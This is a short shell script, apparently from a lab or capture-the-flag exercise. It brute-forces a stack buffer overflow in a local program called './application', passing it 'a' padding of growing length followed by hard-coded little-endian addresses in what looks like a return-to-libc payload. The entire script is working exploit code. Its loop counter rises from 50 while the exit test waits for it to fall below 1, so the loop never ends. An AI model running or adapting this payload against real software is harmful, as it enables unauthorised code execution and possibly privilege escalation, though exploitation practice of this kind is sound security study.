

i=50

while [ $i -gt 0 ]
do

	./application `python -c "print 'a' * $i + '\xa0\x1d\xe3\xf7' + 'aaaa' + '\xd7\xd1\xff\xff'"`
	i=$((i+1))

done
